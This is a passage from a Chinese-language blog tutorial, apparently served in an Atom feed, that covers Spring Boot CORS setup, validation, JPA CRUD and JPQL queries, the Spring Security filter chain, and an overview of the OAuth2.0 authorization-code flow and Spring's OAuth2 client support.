class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Configurations</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> WebMvcConfigurer <span class="title function_">corsMappingConfigurer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WebMvcConfigurer</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCorsMappings</span><span class="params">(CorsRegistry registry)</span> &#123;</span><br><span class="line">                registry.addMapping(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                        <span class="comment">/* Frontend server runs at localhost:3000 */</span></span><br><span class="line">                        .allowedOrigins(<span class="string">&quot;http://localhost:3000&quot;</span>)</span><br><span class="line">                        .allowedMethods(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PATCH&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;OPTIONS&quot;</span>, <span class="string">&quot;HEAD&quot;</span>)</span><br><span class="line">                        .maxAge(<span class="number">3600</span>)</span><br><span class="line">                        .allowedHeaders(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-7-Validation-in-Backend"><a href="#1-7-Validation-in-Backend" class="headerlink" title="1.7 Validation in Backend"></a>1.7 Validation in Backend</h2><p>在后端的 DTO 类型中，往往可以添加许多注解来代替我们完成繁琐且常见的数据校验操作，例如：</p><p><code>@NotNull</code>, <code>@NotBlank</code>, <code>@NotEmpty</code>, <code>@Email</code>, <code>@Min</code>, <code>@Max</code>, <code>@Size</code>, <code>@Pattern</code>, <code>@Phone</code>, <code>@Past</code>；</p><p>以上是库 <code>spring-boot-starter-validation</code> 的校验注解，需要自行安装。但由于它们注解在类的属性上，所以只有当你在 Controller 中获取表单参数时加入 <code>@Valid</code>，并配合 <code>BindingResult</code>（请添加第二参数）才会使这些注解生效。</p><h2 id="1-8-CRUD-Create-Data-Update-Data"><a href="#1-8-CRUD-Create-Data-Update-Data" class="headerlink" title="1.8 CRUD: Create Data / Update Data"></a>1.8 CRUD: Create Data / Update Data</h2><p>用户可能会通过表单向前端提交数据，这个过程通常会造成数据库的某些信息的修改。因此，我们有必要了解一下从前端传入数据，到后端修改数据的过程。</p><p>本节先对 “CRUD” 中的 Create 进行介绍，介绍在以上的 N-Tiers 架构设计中，Create 动作是如何完成的。</p><p>通常情况下，用户会在前端的 <code>&lt;form&gt; &gt; &lt;input&gt;</code> 中填写数据，再 submit，前端会使用 <code>fetch</code> API 向后端发送表单信息。</p><p>对于 Create Data 而言，常常不是幂等的，因此使用 <code>PostMapping</code>，而 Update Data 而言大多数情况下是幂等的，因此使用 <code>PutMapping</code>；</p><p>在 JPA 中，对于简单的数据表而言，一条 <code>repository.save(Entity)</code> 即可完成创建或者更新的操作。</p><h2 id="1-9-CRUD-Delete-Data"><a href="#1-9-CRUD-Delete-Data" class="headerlink" title="1.9 CRUD: Delete Data"></a>1.9 CRUD: Delete Data</h2><p>对于 JPA 的简单表而言，一条 <code>repository.delete(Entity)</code> 即可完成任务。</p><h2 id="1-10-JPQL-Search-Data"><a href="#1-10-JPQL-Search-Data" class="headerlink" title="1.10 JPQL: Search Data"></a>1.10 JPQL: Search Data</h2><p>除了前面的对于数据库的操作过于简单，我们无需写 SQL 语句以外，在用户的搜索场景中，由于搜索条件的复杂性，导致 Spring JPA 生成的 SQL 语句通常有性能问题。</p><p>所以自己写 SQL 语句查询往往是个好选择，开发者还可以根据自己写的 SQL 语句进行自行优化。</p><p>值得注意的是，在模糊搜索中 <code>CONTAINS</code> 和 <code>LIKE</code> 关键字的性能由数据库的类型决定，谨慎使用。</p><p>此外，有两种索引方式：name index、normal index。前者表示在代码中使用参数名嵌入 SQL 索引，后者表示使用类似 <code>?1</code> 指定参数位来嵌入 SQL 索引。</p><p>例如，查找 SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT post FROM posts WHERE post.title LIKE &quot;%hello%&quot;</span><br></pre></td></tr></table></figure><p>那么在 Spring JPA 中，提供了 <code>@Query</code> 方法可以在 <code>JpaRepository</code> 中使用，语法如下（以 name index 为例）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PostRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;PostInfo, Long&gt; &#123;</span><br><span class="line">    <span class="comment">/* Other methods... */</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Query(&quot;SELECT post FROM Post post WHERE post.title LIKE CONCAT(&#x27;%&#x27;, :input, &#x27;%&#x27;) &quot;)</span></span><br><span class="line">    List&lt;PostInfo&gt; <span class="title function_">searchPost</span><span class="params">(String input)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Other methods... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到：</p><ul><li>在内嵌 SQL 语句中，name index 前使用 <code>:</code> 来标识；</li><li>由于插入了变量，因此字符串需要拼接而不是直接使用；</li></ul><h2 id="1-11-One-To-Many-Spring-Data"><a href="#1-11-One-To-Many-Spring-Data" class="headerlink" title="1.11 One-To-Many Spring Data"></a>1.11 One-To-Many Spring Data</h2><p>关系型数据库中，有一种关系是一对多的数据关系。例如，一个用户可以对应持有多个订单。</p><p>这种关系在 Spring JPA 中以 <code>@OneToMany</code> 来表示。值得注意的是，这种关系是有关联的，通常要求父数据（One）被删除时，与该父数据关联的子数据（Many）需要一并全部删除，这种删除关系被称为 Cascade（级联），更详细的信息请参见数据库教程。</p><p>此外，如果是一对多的关系，在关系型数据库中通常还要联接表的列，以便联接查询。在 Spring JPA 中还提供了 <code>@JoinColumn</code> 注解，可以注解到要存放关联列的表的列 field 中（通常位于 “Many” 子数据表中）。</p><h1 id="Chapter-2-Spring-Security"><a href="#Chapter-2-Spring-Security" class="headerlink" title="Chapter 2. Spring Security"></a>Chapter 2. Spring Security</h1><h2 id="2-1-Spring-Security-Overview-Servlet-App"><a href="#2-1-Spring-Security-Overview-Servlet-App" class="headerlink" title="2.1 Spring Security Overview (Servlet App)"></a>2.1 Spring Security Overview (Servlet App)</h2><p>强烈建议至少阅读 <a href="https://docs.spring.io/spring-security/reference/servlet/architecture.html">官方文档的 架构总览</a> 章节，以获得对于 Spring Security 在 Servlet 应用中的宏观上的认识。</p><p>总结下来，Spring Security 在 Servlet 应用上的架构有如下几个重要的点：</p><ul><li><p>以过滤器（filter）为核心。Spring Security 内置很多层 Filter：</p><p><img src="imgs/filterchain.png" width="200px"></p><p><img src="imgs/filterchain2.png" height="250px"></p><blockquote><p>Spring Security包含了众多的过滤器，这些过滤器形成了一条链，所有请求都必须通过这些过滤器后才能成功访问到资源。</p><ul><li><code>UsernamePasswordAuthenticationFilter</code> 过滤器用于处理基于表单方式的登录认证；</li><li><code>BasicAuthenticationFilter</code> 用于处理基于HTTP Basic方式的登录验证，后面还可能包含一系列别的过滤器（可以通过相应配置开启）；</li><li><code>FilterSecurityInterceptor</code> 用于判断当前请求身份认证是否成功，是否有相应的权限，当身份认证失败或者权限不足的时候便会抛出相应的异常；</li><li><code>ExceptionTranslationFilter</code> 能够捕获来自 FilterChain 所有的异常，并进行处理。但是它只会处理两类异常： <code>AuthenticationException</code> 和 <code>AccessDeniedException</code>，其它的异常它会继续抛出。</li></ul><p>另外，可以打印出内部的默认部署的 filters 情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.security.web.session.DisableEncodeUrlFilter@404db674,</span><br><span class="line">org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@50f097b5,</span><br><span class="line">org.springframework.security.web.context.SecurityContextHolderFilter@6fc6deb7,</span><br><span class="line">org.springframework.security.web.header.HeaderWriterFilter@6f76c2cc,</span><br><span class="line">org.springframework.security.web.csrf.CsrfFilter@c29fe36,</span><br><span class="line">org.springframework.security.web.authentication.logout.LogoutFilter@ef60710,</span><br><span class="line">org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@7c2dfa2,</span><br><span class="line">org.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter@4397a639,</span><br><span class="line">org.springframework.security.web.authentication.ui.DefaultLogoutPageGeneratingFilter@7add838c,</span><br><span class="line">org.springframework.security.web.authentication.www.BasicAuthenticationFilter@5cc9d3d0,</span><br><span class="line">org.springframework.security.web.savedrequest.RequestCacheAwareFilter@7da39774,</span><br><span class="line">org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@32b0876c,</span><br><span class="line">org.springframework.security.web.authentication.AnonymousAuthenticationFilter@3662bdff,</span><br><span class="line">org.springframework.security.web.access.ExceptionTranslationFilter@77681ce4,</span><br><span class="line">org.springframework.security.web.access.intercept.AuthorizationFilter@169268a7]</span><br></pre></td></tr></table></figure></blockquote></li></ul><ul><li><p>Spring Security 认证、授权的大致原理就是，借助这些 filters 判断这个请求是否有效，无效则抛出异常拒绝访问；</p></li><li><p>对 Spring Security 的设置，可以说就是对这些 filters 的配置、自定义；</p><ul><li>配置：可以禁用、启用其中的 filters，为其中的 filters 设置参数等；</li><li>自定义：基于 Spring Security 提供的接口类，自定义 filters；</li></ul></li></ul><p>实际上，Spring Security 相当灵活，能够胜任：认证（像登录工作）、授权（像当前登录用户是否有权限）、外部授权服务器的认证和授权（像 OAuth2 协议）等任务。</p><p>其中，使用用户名-密码的方式认证、授权是最简单的一种，本章不作详细介绍。</p><p>最后，如果你发现自己写了一个配置，测试时却怎么都连不上，可以在 <code>application.properties</code> 内打开测试日志，帮助 debug：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">logging.level.org.springframework.security</span>=<span class="string">TRACE</span></span><br></pre></td></tr></table></figure><h2 id="2-2-Spring-Security-OAuth2-0"><a href="#2-2-Spring-Security-OAuth2-0" class="headerlink" title="2.2 Spring Security: OAuth2.0"></a>2.2 Spring Security: OAuth2.0</h2><h3 id="2-2-1-OAuth2-0-Overview"><a href="#2-2-1-OAuth2-0-Overview" class="headerlink" title="2.2.1 OAuth2.0 Overview"></a>2.2.1 OAuth2.0 Overview</h3><p>Spring Security 除了普通的自定义用户名-密码验证，还支持 OAuth2.0 外部的授权服务器验证。</p><p>在了解 Spring Security 如何操作前，先了解 OAuth2.0 的协议是什么。</p><p>查看 <a href="https://www.rfc-editor.org/rfc/rfc6749">RFC 6749 标准</a>，其提供了抽象的协议流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+--------+                               +---------------+</span><br><span class="line">|        |--(A)- Authorization Request -&gt;|   Resource    |</span><br><span class="line">|        |                               |     Owner     |</span><br><span class="line">|        |&lt;-(B)-- Authorization Grant ---|               |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |--(C)-- Authorization Grant --&gt;| Authorization |</span><br><span class="line">| Client |                               |     Server    |</span><br><span class="line">|        |&lt;-(D)----- Access Token -------|               |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |--(E)----- Access Token ------&gt;|    Resource   |</span><br><span class="line">|        |                               |     Server    |</span><br><span class="line">|        |&lt;-(F)--- Protected Resource ---|               |</span><br><span class="line">+--------+                               +---------------+</span><br></pre></td></tr></table></figure><p>简单来说，OAuth2.0 协议的过程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(A) 用户（就是 resource owner）访问客户端，客户端将用户导向认证服务器。</span><br><span class="line"></span><br><span class="line">(B) 用户选择是否给予客户端授权。</span><br><span class="line"></span><br><span class="line">(C) 假设用户给予授权，认证服务器先生成一个授权码，并返回给用户，认证服务器将用户导向客户端事先指定的“重定向URI”（redirect uri），同时附上一个授权码（code）。</span><br><span class="line"></span><br><span class="line">(D) 客户端收到授权码，附上早先的“重定向URI”，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。</span><br><span class="line"></span><br><span class="line">(E) 认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）或更新令牌（refresh token）。</span><br><span class="line"></span><br><span class="line">(F) 客户端验证身份令牌信息的完整性和正确性，并解析获取当前用户信息。</span><br></pre></td></tr></table></figure><p>这就是 OAuth2.0 协议最规范、最完整、最常用、最安全的使用方法：授权码模式。RFC 6749 标准还规定了其他 3 种获取令牌（token）的模式：</p><ul><li>简化模式；</li><li>密码模式；</li><li>客户端模式；</li></ul><p>这些方法的安全性和规范性依次递减。</p><p>此外，我们从上图可知，一个后端程序想要使用 OAuth2.0，我们至少需要搭建：</p><ul><li>一个 OAuth2.0 客户端（用于处理用户、授权服务器、资源服务器之间的交互）；</li><li>一个授权服务器（用户的认证信息存放位置）；</li><li>一个资源服务器（用户的资源存放位置）；</li></ul><p>如果你使用第三方的 OAuth2.0 认证服务，就是说，使用第三方的认证服务来获取这个用户的有限的身份信息，那么只需要开发自己的客户端（client）即可，<strong>授权服务器（Authorization Server）和资源服务器（Resource Server）都是由第三方提供的</strong>。</p><blockquote><p>举个例子，Github 第三方授权见过吧？很多网站都支持 QQ / 微信第三方登录吧？它们的底层都可以使用 OAuth2.0 来完成。</p><p>使用 OAuth2.0 可以验证当前的用户的身份，只不过是：在不需要知道用户的密钥的前提下，将用户的认证、授权委托给第三方（授权服务器）来完成，客户端（client）只要询问第三方，这个用户合不合法、用户的基本信息是什么（<u>有限的信息，给多少取决于第三方授权服务器，以及用户在弹出的授权框里自己指定</u>），就能证明这个用户的身份了。</p></blockquote><p>本章也不说 OAuth2.0 授权服务器、资源服务器的搭建，只说 OAuth2.0 客户端的搭建。</p><p>如果使用的是第三方授权服务器、资源服务器，一般第三方平台会给你接口说明（客户端怎么访问授权服务器和资源服务器），并要求你出示自己的身份，注册一对 <code>client_id</code>、<code>client_key</code>；</p><p>为什么需要你注册一个 <code>client_id/client_key</code> 呢？这是为了保护 App 使用者（最终用户）的合法权益，确保客户端是可信的，不是什么伪造的中间人都可以访问授权服务器、读取用户信息的。</p><p>有了这对 <code>client_id</code>、<code>client_key</code>，就可以认证应用开发者和客户端的身份，在与第三方授权服务器通信时携带，就可以确保客户端是合法的。</p><h3 id="2-2-2-OAuth2-0-Client-in-Spring-Security"><a href="#2-2-2-OAuth2-0-Client-in-Spring-Security" class="headerlink" title="2.2.2 OAuth2.0 Client in Spring Security"></a>2.2.2 OAuth2.0 Client in Spring Security</h3><blockquote><p>那么 Spring Security 是怎么支持 OAuth2.0 的呢？我们不妨先了解一下 Spring Security 的历史：</p><p>大约十年前，Spring 引入了一个社区驱动的开源项目 Spring Security OAuth， 并将其纳入 Spring 项目组合中。到今天为止，这个项目己经发展成为一个成熟的项目，可以支持大部分 OAuth 规范，包括资源服务器、 客户端和授权服务器等。</p><p>然而早期的项目存在一些问题，例如：</p><ul><li>OAuth 是在早期完成的，开发者无法预料未来的变化以及这些代码到底要被怎么使用， 这导致很多 Spring 项目提供了自己的 OAuth 支持，也就带来了 OAuth 支持的碎片化。</li><li>最早的OAuth项目同时支特 OAuth1.0 和 OAuth2.0，而现在 OAuth1.0 早已经不再使用， 可以放弃了。</li><li>现在我们有更多的库可以选择，可以在这些库的基础上去开发，以便更好地支持JWT等新技术。</li></ul><p>基于以上这些原因，官方决定重写 Spring Security OAuth，以便更好地协调 Spring 和 OAuth，并简化代码库，使 Spring 的 OAuth 支持更加灵活。然而，在重写的过程中，发生了不少波折。</p><p>2018年1月30日，Spring 官方发了一个通知，表示要逐渐停止现有的 OAuth2支持，然后在 Spring Security  5中构建下一代 OAuth2.0 支持。这么做的原因是因为当时 OAuth2 的落地方案比较混乱，在 Spring Security  OAuth、 Spring Cloud Security、Spring Boot 1.5.x 以及当时最新的Spring Security  5.x 中都提供了对 OAuth2 的实现。以至于当开发者需要使用 OAuth2 时，不得不问，到底选哪一个依赖合适呢？</p><p>所以 Spring 官方决定有必要将 OAuth2.0 的支持统一到一个项目中，以便为用户提供明确的选择，并避免任何潜在的混乱，同时 OAuth2.0 的开发文档也要重新编写，以方便开发人员学习。所有的决定将在 Spring Security 5 中开始，构建下一代 OAuth2.0 的支持。从那个时候起，Spring Security OAuth  项目就正式处于维护模式。官方将提供至少一年的错识/安全修复程序，并且会考虑添加次要功能，但不会添加主要功能。同时将 Spring Security OAuth 中的所有功能重构到 Spring Security 5.x 中。</p><p>到了2019年11月14日，Spring 官方又发布一个通知，这次的通知首先表示 Spring Security OAuth 在迁往  Spring Security 5.x 的过程非常顺利，大部分迁程工作已经完成了，剩下的将在 5.3 版本中完成迁移，在迁移的过程中还添加了许多新功能。包括对 OpenID Connect1.0 的支持。同时还宣布将不再支持授权服务器，不支持的原因有两个：</p><ol><li>在2019年，已经有大量的商业和开源授权服务器可用；</li><li>授权服务器是使用一个库来构建产品，而 Spring Security 作为框架，并不适合做这件事情。</li></ol><p>一石激起千层浪，许多开发者表示对此难以接受。这件事也在Spring 社区引发了激烈的讨论，好在 Spring 官方愿意倾听来自社区的声音。</p><p>到了2020年4月15日，Spring 官方宣布启动 Spring Authorization server 项目。这是一个由  Spring Security 团队领导的社区驱动的项目，致力于向 Spring 社区提供 Authorization  Server支持，也就是说，Spring 又重新支持授权服务器了。</p><p>于是在 2020年8月21日，Spring Authorization Server 0.0.1 正式发布。</p></blockquote><p>当前的 Spring Security 对于 OAuth2.0 的支持主要分为 2 个部分：</p><ul><li>OAuth2.0 Client（内置提供了强大的 OAuth2.0 登录功能）；</li><li>OAuth2.0 Resources Server；</li></ul><p>授权服务器的部分已经从 Spring Security 项目中独立出去了（Spring Authorization Server）。</p><p>这里就详细讨论 OAuth2.0 客户端的设计和使用。在 Gradle 中这么导入：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation <span class="string">&#x27;org.springframework.boot:spring-boot-starter-oauth2-client&#x27;</span></span><br></pre></td></tr></table></figure><p>Spring Security OAuth2.0 Client 支持：</p><ul><li>认证：JWT Bearer 令牌的处理；</li><li>授权：授权码的保存、刷新令牌的操作、客户端认证信息的操作、用户认证信息的保存……</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;前置条件：WEB 基础（Socket，HTTP 整套规范），SQL 和数据库基础，Java 语言基础、前端基础（至少了解一种前端框架，本文以 React 为例）；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;Chapter-0-Basic-</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="Java" scheme="https://blog.sjtuxhw.top/tags/Java/"/>
    
    <category term="Spring" scheme="https://blog.sjtuxhw.top/tags/Spring/"/>
    
  </entry>
  
</feed>
